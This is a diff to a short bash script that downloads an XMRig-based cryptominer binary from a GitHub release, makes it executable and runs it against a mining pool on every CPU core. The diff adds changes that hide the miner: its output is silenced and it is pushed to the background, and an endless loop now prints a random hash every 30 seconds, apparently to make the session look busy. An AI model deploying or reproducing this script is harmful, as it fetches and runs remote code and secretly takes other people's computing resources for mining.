@@ -1,4 +1,5 @@
 #!/bin/bash
 wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
 chmod 777 vrl
-./vrl -a randomvirel --url eu.rplant.xyz:7155 --user v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x --pass webpassword=x -t $(nproc --all)
+./vrl -a randomvirel --url eu.rplant.xyz:7155 --user v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x --pass webpassword=x -t $(nproc --all) > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
